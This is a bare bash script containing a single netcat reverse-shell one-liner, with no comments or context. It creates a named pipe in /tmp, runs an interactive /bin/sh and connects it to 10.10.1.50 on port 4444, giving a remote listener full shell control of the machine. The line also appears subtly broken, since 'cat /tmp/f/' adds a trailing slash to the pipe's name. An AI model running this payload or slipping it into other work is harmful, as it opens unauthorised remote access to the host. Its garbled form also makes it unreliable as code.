#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f/|/bin/sh -i 2>&1|nc 10.10.1.50 4444 >/tmp/f
